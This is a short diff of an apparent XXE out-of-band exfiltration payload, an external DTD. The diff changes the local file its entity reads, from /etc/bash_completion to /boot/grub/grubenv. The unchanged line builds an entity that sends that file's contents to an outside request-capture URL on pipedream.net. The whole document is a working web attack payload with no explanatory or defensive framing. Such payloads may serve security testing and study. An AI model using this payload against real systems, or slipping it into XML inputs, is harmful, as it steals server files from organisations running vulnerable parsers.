@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///etc/bash_completion">
+<!ENTITY % file SYSTEM "file:///boot/grub/grubenv">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enyr00wmiyji.x.pipedream.net/?%file;'>">
